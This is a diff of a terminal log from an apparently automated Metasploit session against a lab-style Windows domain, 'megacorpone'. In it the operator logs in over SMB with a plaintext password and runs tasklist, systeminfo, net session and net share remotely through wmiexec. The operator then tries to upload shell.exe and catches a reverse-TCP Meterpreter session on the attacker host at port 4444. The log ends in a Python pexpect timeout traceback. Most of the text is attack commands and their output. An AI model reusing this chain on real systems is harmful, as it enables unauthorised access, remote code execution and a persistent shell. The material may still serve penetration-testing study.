@@ -1,4 +1,16 @@
-[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\                                                  
+[*] Starting the Metasploit Framework console.../
+[*] Starting the Metasploit Framework console...-
+[*] Starting the Metasploit Framework console...\
+[*] starting the Metasploit Framework console...|
+[*] STarting the Metasploit Framework console.../
+[*] StArting the Metasploit Framework console...-
+[*] StaRting the Metasploit Framework console...\
+[*] StarTing the Metasploit Framework console...|
+[*] StartIng the Metasploit Framework console.../
+[*] StartiNg the Metasploit Framework console...-
+[*] StartinG the Metasploit Framework console...\
+
+                                                  
 [0m[36m[37mCall trans opt: received. 2-19-98 13:24:18 REC:Loc
 
      Trace program: running
@@ -36,7 +48,8 @@ Metasploit tip: View missing module options with [32mshow
 missing[0m
 
 [?1034h[4mmsf6[0m [0m> resource resource1.rc
-resource resource1.rc
+resource resource1.rc
+
 [0m[1m[34m[*][0m Processing /root/resource1.rc for ERB directives.
 resource (/root/resource1.rc)> use auxiliary/scanner/smb/smb_login
 smbclient //172.22.117.20/C$ -U megacorpone/tstark
@@ -64,7 +77,8 @@ resource (/root/resource1.rc)> run
 [0m
 [1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m megacorpone\tstark
+[1m[34m[*][0m megacorpone\tstark
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -73,125 +87,244 @@ resource (/root/resource1.rc)> set COMMAND tasklist
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Image Name                     PID Session Name        Session#    Mem Usage
-========================= ======== ================ =========== ============
-System Idle Process              0 Services                   0          8 K
-System                           4 Services                   0         28 K
-Registry                        72 Services                   0      8,592 K
-smss.exe                       360 Services                   0        232 K
-csrss.exe                      460 Services                   0      1,868 K
-wininit.exe                    528 Services                   0        444 K
-csrss.exe                      536 Console                    1        860 K
-winlogon.exe                   600 Console                    1        952 K
-services.exe                   628 Services                   0      7,972 K
-lsass.exe                      664 Services                   0     11,688 K
-svchost.exe                    752 Services                   0     15,220 K
-fontdrvhost.exe                760 Console                    1         60 K
-fontdrvhost.exe                772 Services                   0        212 K
-svchost.exe                    852 Services                   0      9,960 K
-LogonUI.exe                    936 Console                    1     14,340 K
-dwm.exe                        944 Console                    1     11,324 K
-svchost.exe                    980 Services                   0     60,292 K
-svchost.exe                   1016 Services                   0      6,336 K
-svchost.exe                    428 Services                   0     10,860 K
-svchost.exe                    448 Services                   0     15,292 K
-svchost.exe                    524 Services                   0     12,516 K
-svchost.exe                    716 Services                   0      1,868 K
-svchost.exe                    392 Services                   0     10,692 K
-svchost.exe                   1156 Services                   0      9,524 K
-svchost.exe                   1300 Services                   0      3,616 K
-Memory Compression            1608 Services                   0     46,144 K
-VSSVC.exe                     1652 Services                   0      2,188 K
-svchost.exe                   1664 Services                   0      2,748 K
-svchost.exe                   1776 Services                   0      1,944 K
-svchost.exe                   1784 Services                   0      2,804 K
-spoolsv.exe                   1932 Services                   0      3,344 K
-svchost.exe                   1972 Services                   0     18,392 K
-svchost.exe                   2160 Services                   0      4,676 K
-svchost.exe                   2256 Services                   0      2,120 K
-svchost.exe                   2348 Services                   0     24,640 K
-MsMpEng.exe                   2396 Services                   0    108,896 K
-svchost.exe                   2536 Services                   0      1,740 K
-svchost.exe                   1288 Services                   0      1,172 K
-csrss.exe                     2612                            2      1,564 K
-winlogon.exe                  2868                            2      1,856 K
-dwm.exe                       1236                            2     16,932 K
-fontdrvhost.exe               2108                            2        864 K
-svchost.exe                   3164 Services                   0     10,968 K
-NisSrv.exe                    3204 Services                   0      4,488 K
-svchost.exe                   2364 Services                   0     10,424 K
-MoUsoCoreWorker.exe           3608 Services                   0     17,400 K
-MicrosoftEdgeUpdate.exe       3200 Services                   0      1,304 K
-SgrmBroker.exe                2492 Services                   0      4,304 K
-uhssvc.exe                    1768 Services                   0      1,748 K
-svchost.exe                   3328 Services                   0      4,080 K
-SearchIndexer.exe             3528 Services                   0     13,340 K
-svchost.exe                   5060 Services                   0      2,148 K
-rdpclip.exe                   1448                            2      2,308 K
-sihost.exe                    4348                            2     10,660 K
-svchost.exe                   4340                            2      9,736 K
-taskhostw.exe                 3508                            2      4,992 K
-ctfmon.exe                    4884                            2      2,572 K
-explorer.exe                   712                            2     52,572 K
-svchost.exe                   4908                            2      4,304 K
-SearchApp.exe                 3752                            2        700 K
-RuntimeBroker.exe             3616                            2     12,140 K
-StartMenuExperienceHost.e     4580                            2        388 K
-RuntimeBroker.exe             3632                            2      5,684 K
-SearchApp.exe                 3396                            2        776 K
-RuntimeBroker.exe             5220                            2      9,420 K
-SecurityHealthSystray.exe     5464                            2      2,552 K
-SecurityHealthService.exe     5492 Services                   0      7,580 K
-OneDrive.exe                  5500                            2      4,360 K
-ApplicationFrameHost.exe      3048                            2      2,724 K
-svchost.exe                   6044 Services                   0      2,560 K
-YourPhone.exe                 5208                            2        548 K
-RuntimeBroker.exe             3496                            2      4,436 K
-UserOOBEBroker.exe            5772                            2      4,156 K
-ShellExperienceHost.exe       4016                            2        596 K
-RuntimeBroker.exe              728                            2      7,660 K
-svchost.exe                    976                            2      1,864 K
-SystemSettingsBroker.exe      5364                            2      3,180 K
-svchost.exe                   1348 Services                   0      1,532 K
-cmd.exe                       6116 Services                   0        540 K
-conhost.exe                   5088 Services                   0      6,200 K
-shell.exe                     1684 Services                   0      4,856 K
-msedge.exe                    4692                            2     24,996 K
-msedge.exe                    1956                            2      1,796 K
-msedge.exe                    5592                            2     15,028 K
-msedge.exe                    2780                            2      8,836 K
-msedge.exe                    1544                            2      4,388 K
-cmd.exe                       6192 Services                   0        540 K
-conhost.exe                   6988 Services                   0      6,204 K
-shell.exe                     3892 Services                   0      4,840 K
-dllhost.exe                    720                            2      1,896 K
-TextInputHost.exe             2916                            2      9,056 K
-Microsoft.Photos.exe          6736                            2      1,320 K
-RuntimeBroker.exe             4724                            2     10,048 K
-cmd.exe                       6932 Services                   0        544 K
-conhost.exe                   5532 Services                   0      6,200 K
-shell.exe                     7100 Services                   0      5,672 K
-cmd.exe                       5912 Services                   0        544 K
-conhost.exe                   6084 Services                   0      6,204 K
-shell.exe                     4772 Services                   0      4,808 K
-LogonUI.exe                   4432                            2      8,744 K
-cmd.exe                       5900 Services                   0      3,396 K
-conhost.exe                   7736 Services                   0     11,440 K
-shell.exe                     8040 Services                   0      8,040 K
-svchost.exe                   7140 Services                   0      7,120 K
-cmd.exe                       5540 Services                   0      3,400 K
-conhost.exe                   6468 Services                   0     11,404 K
-shell.exe                     3832 Services                   0      7,980 K
-cmd.exe                       6812 Services                   0      3,396 K
-conhost.exe                   5412 Services                   0     11,380 K
-shell.exe                     4220 Services                   0      7,880 K
-nXITvMRO.exe                  5240 Services                   0      3,212 K
-nXITvMRO.exe                  6072 Services                   0      3,828 K
-WmiPrvSE.exe                  6432 Services                   0      9,564 K
-cmd.exe                       7384 Services                   0      3,768 K
-conhost.exe                   6336 Services                   0     11,960 K
-tasklist.exe                  4912 Services                   0      8,580 K
+[1m[34m[*][0m 
+
+Image Name                     PID Session Name        Session#    Mem Usage
+
+========================= ======== ================ =========== ============
+
+System Idle Process              0 Services                   0          8 K
+
+System                           4 Services                   0         28 K
+
+Registry                        72 Services                   0      8,592 K
+
+smss.exe                       360 Services                   0        232 K
+
+csrss.exe                      460 Services                   0      1,868 K
+
+wininit.exe                    528 Services                   0        444 K
+
+csrss.exe                      536 Console                    1        860 K
+
+winlogon.exe                   600 Console                    1        952 K
+
+services.exe                   628 Services                   0      7,972 K
+
+lsass.exe                      664 Services                   0     11,688 K
+
+svchost.exe                    752 Services                   0     15,220 K
+
+fontdrvhost.exe                760 Console                    1         60 K
+
+fontdrvhost.exe                772 Services                   0        212 K
+
+svchost.exe                    852 Services                   0      9,960 K
+
+LogonUI.exe                    936 Console                    1     14,340 K
+
+dwm.exe                        944 Console                    1     11,324 K
+
+svchost.exe                    980 Services                   0     60,292 K
+
+svchost.exe                   1016 Services                   0      6,336 K
+
+svchost.exe                    428 Services                   0     10,860 K
+
+svchost.exe                    448 Services                   0     15,292 K
+
+svchost.exe                    524 Services                   0     12,516 K
+
+svchost.exe                    716 Services                   0      1,868 K
+
+svchost.exe                    392 Services                   0     10,692 K
+
+svchost.exe                   1156 Services                   0      9,524 K
+
+svchost.exe                   1300 Services                   0      3,616 K
+
+Memory Compression            1608 Services                   0     46,144 K
+
+VSSVC.exe                     1652 Services                   0      2,188 K
+
+svchost.exe                   1664 Services                   0      2,748 K
+
+svchost.exe                   1776 Services                   0      1,944 K
+
+svchost.exe                   1784 Services                   0      2,804 K
+
+spoolsv.exe                   1932 Services                   0      3,344 K
+
+svchost.exe                   1972 Services                   0     18,392 K
+
+svchost.exe                   2160 Services                   0      4,676 K
+
+svchost.exe                   2256 Services                   0      2,120 K
+
+svchost.exe                   2348 Services                   0     24,640 K
+
+MsMpEng.exe                   2396 Services                   0    108,896 K
+
+svchost.exe                   2536 Services                   0      1,740 K
+
+svchost.exe                   1288 Services                   0      1,172 K
+
+csrss.exe                     2612                            2      1,564 K
+
+winlogon.exe                  2868                            2      1,856 K
+
+dwm.exe                       1236                            2     16,932 K
+
+fontdrvhost.exe               2108                            2        864 K
+
+svchost.exe                   3164 Services                   0     10,968 K
+
+NisSrv.exe                    3204 Services                   0      4,488 K
+
+svchost.exe                   2364 Services                   0     10,424 K
+
+MoUsoCoreWorker.exe           3608 Services                   0     17,400 K
+
+MicrosoftEdgeUpdate.exe       3200 Services                   0      1,304 K
+
+SgrmBroker.exe                2492 Services                   0      4,304 K
+
+uhssvc.exe                    1768 Services                   0      1,748 K
+
+svchost.exe                   3328 Services                   0      4,080 K
+
+SearchIndexer.exe             3528 Services                   0     13,340 K
+
+svchost.exe                   5060 Services                   0      2,148 K
+
+rdpclip.exe                   1448                            2      2,308 K
+
+sihost.exe                    4348                            2     10,660 K
+
+svchost.exe                   4340                            2      9,736 K
+
+taskhostw.exe                 3508                            2      4,992 K
+
+ctfmon.exe                    4884                            2      2,572 K
+
+explorer.exe                   712                            2     52,572 K
+
+svchost.exe                   4908                            2      4,304 K
+
+SearchApp.exe                 3752                            2        700 K
+
+RuntimeBroker.exe             3616                            2     12,140 K
+
+StartMenuExperienceHost.e     4580                            2        388 K
+
+RuntimeBroker.exe             3632                            2      5,684 K
+
+SearchApp.exe                 3396                            2        776 K
+
+RuntimeBroker.exe             5220                            2      9,420 K
+
+SecurityHealthSystray.exe     5464                            2      2,552 K
+
+SecurityHealthService.exe     5492 Services                   0      7,580 K
+
+OneDrive.exe                  5500                            2      4,360 K
+
+ApplicationFrameHost.exe      3048                            2      2,724 K
+
+svchost.exe                   6044 Services                   0      2,560 K
+
+YourPhone.exe                 5208                            2        548 K
+
+RuntimeBroker.exe             3496                            2      4,436 K
+
+UserOOBEBroker.exe            5772                            2      4,156 K
+
+ShellExperienceHost.exe       4016                            2        596 K
+
+RuntimeBroker.exe              728                            2      7,660 K
+
+svchost.exe                    976                            2      1,864 K
+
+SystemSettingsBroker.exe      5364                            2      3,180 K
+
+svchost.exe                   1348 Services                   0      1,532 K
+
+cmd.exe                       6116 Services                   0        540 K
+
+conhost.exe                   5088 Services                   0      6,200 K
+
+shell.exe                     1684 Services                   0      4,856 K
+
+msedge.exe                    4692                            2     24,996 K
+
+msedge.exe                    1956                            2      1,796 K
+
+msedge.exe                    5592                            2     15,028 K
+
+msedge.exe                    2780                            2      8,836 K
+
+msedge.exe                    1544                            2      4,388 K
+
+cmd.exe                       6192 Services                   0        540 K
+
+conhost.exe                   6988 Services                   0      6,204 K
+
+shell.exe                     3892 Services                   0      4,840 K
+
+dllhost.exe                    720                            2      1,896 K
+
+TextInputHost.exe             2916                            2      9,056 K
+
+Microsoft.Photos.exe          6736                            2      1,320 K
+
+RuntimeBroker.exe             4724                            2     10,048 K
+
+cmd.exe                       6932 Services                   0        544 K
+
+conhost.exe                   5532 Services                   0      6,200 K
+
+shell.exe                     7100 Services                   0      5,672 K
+
+cmd.exe                       5912 Services                   0        544 K
+
+conhost.exe                   6084 Services                   0      6,204 K
+
+shell.exe                     4772 Services                   0      4,808 K
+
+LogonUI.exe                   4432                            2      8,744 K
+
+cmd.exe                       5900 Services                   0      3,396 K
+
+conhost.exe                   7736 Services                   0     11,440 K
+
+shell.exe                     8040 Services                   0      8,040 K
+
+svchost.exe                   7140 Services                   0      7,120 K
+
+cmd.exe                       5540 Services                   0      3,400 K
+
+conhost.exe                   6468 Services                   0     11,404 K
+
+shell.exe                     3832 Services                   0      7,980 K
+
+cmd.exe                       6812 Services                   0      3,396 K
+
+conhost.exe                   5412 Services                   0     11,380 K
+
+shell.exe                     4220 Services                   0      7,880 K
+
+nXITvMRO.exe                  5240 Services                   0      3,212 K
+
+nXITvMRO.exe                  6072 Services                   0      3,828 K
+
+WmiPrvSE.exe                  6432 Services                   0      9,564 K
+
+cmd.exe                       7384 Services                   0      3,768 K
+
+conhost.exe                   6336 Services                   0     11,960 K
+
+tasklist.exe                  4912 Services                   0      8,580 K
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -200,56 +333,106 @@ resource (/root/resource1.rc)> set COMMAND systeminfo
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Host Name:                 WINDOWS10
-OS Name:                   Microsoft Windows 10 Pro N
-OS Version:                10.0.19042 N/A Build 19042
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Member Workstation
-OS Build Type:             Multiprocessor Free
-Registered Owner:          sysadmin
-Registered Organization:   
-Product ID:                00331-60000-00000-AA609
-Original Install Date:     5/10/2021, 12:17:16 AM
-System Boot Time:          6/18/2023, 7:32:13 PM
-System Manufacturer:       Microsoft Corporation
-System Model:              Virtual Machine
-System Type:               x64-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: AMD64 Family 25 Model 33 Stepping 0 AuthenticAMD ~3700 Mhz
-BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 11/1/2019
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             en-us;English (United States)
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
-Total Physical Memory:     2,033 MB
-Available Physical Memory: 1,080 MB
-Virtual Memory: Max Size:  3,761 MB
-Virtual Memory: Available: 2,101 MB
-Virtual Memory: In Use:    1,660 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    megacorpone.local
-Logon Server:              N/A
-Hotfix(s):                 7 Hotfix(s) Installed.
-                           [01]: KB5005539
-                           [02]: KB4562830
-                           [03]: KB4570334
-                           [04]: KB4580325
-                           [05]: KB4586864
-                           [06]: KB5006670
-                           [07]: KB5005699
-Network Card(s):           2 NIC(s) Installed.
-                           [01]: Microsoft Hyper-V Network Adapter
-                                 Connection Name: Ethernet
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 172.22.117.20
-                           [02]: Microsoft Hyper-V Network Adapter
-                                 Connection Name: Ethernet 2
-                                 Status:          Media disconnected
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+[1m[34m[*][0m 
+
+Host Name:                 WINDOWS10
+
+OS Name:                   Microsoft Windows 10 Pro N
+
+OS Version:                10.0.19042 N/A Build 19042
+
+OS Manufacturer:           Microsoft Corporation
+
+OS Configuration:          Member Workstation
+
+OS Build Type:             Multiprocessor Free
+
+Registered Owner:          sysadmin
+
+Registered Organization:   
+
+Product ID:                00331-60000-00000-AA609
+
+Original Install Date:     5/10/2021, 12:17:16 AM
+
+System Boot Time:          6/18/2023, 7:32:13 PM
+
+System Manufacturer:       Microsoft Corporation
+
+System Model:              Virtual Machine
+
+System Type:               x64-based PC
+
+Processor(s):              1 Processor(s) Installed.
+
+                           [01]: AMD64 Family 25 Model 33 Stepping 0 AuthenticAMD ~3700 Mhz
+
+BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 11/1/2019
+
+Windows Directory:         C:\Windows
+
+System Directory:          C:\Windows\system32
+
+Boot Device:               \Device\HarddiskVolume1
+
+System Locale:             en-us;English (United States)
+
+Input Locale:              en-us;English (United States)
+
+Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
+
+Total Physical Memory:     2,033 MB
+
+Available Physical Memory: 1,080 MB
+
+Virtual Memory: Max Size:  3,761 MB
+
+Virtual Memory: Available: 2,101 MB
+
+Virtual Memory: In Use:    1,660 MB
+
+Page File Location(s):     C:\pagefile.sys
+
+Domain:                    megacorpone.local
+
+Logon Server:              N/A
+
+Hotfix(s):                 7 Hotfix(s) Installed.
+
+                           [01]: KB5005539
+
+                           [02]: KB4562830
+
+                           [03]: KB4570334
+
+                           [04]: KB4580325
+
+                           [05]: KB4586864
+
+                           [06]: KB5006670
+
+                           [07]: KB5005699
+
+Network Card(s):           2 NIC(s) Installed.
+
+                           [01]: Microsoft Hyper-V Network Adapter
+
+                                 Connection Name: Ethernet
+
+                                 DHCP Enabled:    No
+
+                                 IP address(es)
+
+                                 [01]: 172.22.117.20
+
+                           [02]: Microsoft Hyper-V Network Adapter
+
+                                 Connection Name: Ethernet 2
+
+                                 Status:          Media disconnected
+
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -258,25 +441,44 @@ resource (/root/resource1.rc)> set COMMAND net session
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Computer               User name            Client Type       Opens Idle time
-
--------------------------------------------------------------------------------
-\\127.0.0.1            tstark                                     1 01D 06H 32M 
-\\127.0.0.1            tstark                                     1 01D 06H 22M 
-\\127.0.0.1            tstark                                     1 01D 05H 53M 
-\\127.0.0.1            tstark                                     1 01D 05H 40M 
-\\127.0.0.1            tstark                                     1 04:14:59    
-\\127.0.0.1            tstark                                     1 03:59:27    
-\\127.0.0.1            tstark                                     1 03:38:43    
-\\127.0.0.1            tstark                                     0 00:00:09    
-\\127.0.0.1            WINDOWS10$                                 0 00:00:05    
-\\127.0.0.1            tstark                                     0 00:00:08    
-\\127.0.0.1            tstark                                     0 00:00:02    
-\\127.0.0.1            tstark                                     1 00:00:00    
-\\172.22.117.100       tstark                                     0 00:00:01    
-The command completed successfully.
-
+[1m[34m[*][0m 
+
+Computer               User name            Client Type       Opens Idle time
+
+
+
+-------------------------------------------------------------------------------
+
+\\127.0.0.1            tstark                                     1 01D 06H 32M 
+
+\\127.0.0.1            tstark                                     1 01D 06H 22M 
+
+\\127.0.0.1            tstark                                     1 01D 05H 53M 
+
+\\127.0.0.1            tstark                                     1 01D 05H 40M 
+
+\\127.0.0.1            tstark                                     1 04:14:59    
+
+\\127.0.0.1            tstark                                     1 03:59:27    
+
+\\127.0.0.1            tstark                                     1 03:38:43    
+
+\\127.0.0.1            tstark                                     0 00:00:09    
+
+\\127.0.0.1            WINDOWS10$                                 0 00:00:05    
+
+\\127.0.0.1            tstark                                     0 00:00:08    
+
+\\127.0.0.1            tstark                                     0 00:00:02    
+
+\\127.0.0.1            tstark                                     1 00:00:00    
+
+\\172.22.117.100       tstark                                     0 00:00:01    
+
+The command completed successfully.
+
+
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
@@ -285,19 +487,30 @@ resource (/root/resource1.rc)> set COMMAND net share
 resource (/root/resource1.rc)> run
 [0m[1m[34m[*][0m Running for 172.22.117.20...
 [1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used
-[1m[34m[*][0m 
-Share name   Resource                        Remark
-
--------------------------------------------------------------------------------
-C$           C:\                             Default share                     
-IPC$                                         Remote IPC                        
-ADMIN$       C:\Windows                      Remote Admin                      
-The command completed successfully.
-
+[1m[34m[*][0m 
+
+Share name   Resource                        Remark
+
+
+
+-------------------------------------------------------------------------------
+
+C$           C:\                             Default share                     
+
+IPC$                                         Remote IPC                        
+
+ADMIN$       C:\Windows                      Remote Admin                      
+
+The command completed successfully.
+
+
+
 
 [1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
 [1m[34m[*][0m Auxiliary module execution completed
-[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> smbclient //172.22.117.20/C$ -U m egacorpone/tstark
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> smbclient //172.22.117.20/C$ -U m 
+egacorpone/tstark
+
 [0m[1m[34m[*][0m exec: smbclient //172.22.117.20/C$ -U megacorpone/tstark
 
 Enter MEGACORPONE\tstark's password: Password!
@@ -305,11 +518,14 @@ Enter MEGACORPONE\tstark's password: Password!
 Try "help" to get a list of possible commands.
 [?2004hsmb: \> put shell.exe
 put shell.exe
-[?2004lNT_STATUS_SHARING_VIOLATION opening remote file \shell.exe
+[?2004l
+NT_STATUS_SHARING_VIOLATION opening remote file \shell.exe
 [?2004hsmb: \> exit
 exit
-[?2004l[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc
-resource resource2.rc
+[?2004l
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc
+resource resource2.rc
+
 [0m[1m[34m[*][0m Processing /root/resource2.rc for ERB directives.
 resource (/root/resource2.rc)> use exploit/multi/handler
 [0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
@@ -354,3 +570,44 @@ resource (/root/resource2.rc)> run
 [0m[1m[34m[*][0m Meterpreter session 7 opened (172.22.117.100:4444 -> 172.22.117.20:50108 ) at 2023-06-19 10:19:59 -0400
 background
 background
+
+
+METERPRETER SHELL TO BACKGROUND
+Traceback (most recent call last):
+  File "/root/metascriptv03.py", line 100, in <module>
+    msf_script.expect('msf6')
+  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 343, in expect
+    return self.expect_list(compiled_pattern_list,
+  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 372, in expect_list
+    return exp.expect_loop(timeout)
+  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 181, in expect_loop
+    return self.timeout(e)
+  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 144, in timeout
+    raise exc
+pexpect.exceptions.TIMEOUT: Timeout exceeded.
+<pexpect.pty_spawn.spawn object at 0x7fdeeb83c100>
+command: /usr/bin/msfconsole
+args: [b'/usr/bin/msfconsole']
+buffer (last 100 chars): 'on 7 opened (172.22.117.100:4444 -> 172.22.117.20:50108 ) at 2023-06-19 10:19:59 -0400\r\nbackground\r\n'
+before (last 100 chars): 'on 7 opened (172.22.117.100:4444 -> 172.22.117.20:50108 ) at 2023-06-19 10:19:59 -0400\r\nbackground\r\n'
+after: <class 'pexpect.exceptions.TIMEOUT'>
+match: None
+match_index: None
+exitstatus: None
+flag_eof: False
+pid: 13888
+child_fd: 5
+closed: False
+timeout: 30
+delimiter: <class 'pexpect.exceptions.EOF'>
+logfile: <_io.TextIOWrapper name='Metascript_logs.txt' mode='w' encoding='utf-8'>
+logfile_read: None
+logfile_send: None
+maxread: 2000
+ignorecase: False
+searchwindowsize: None
+delaybeforesend: 0.05
+delayafterclose: 0.1
+delayafterterminate: 0.1
+searcher: searcher_re:
+    0: re.compile('msf6')
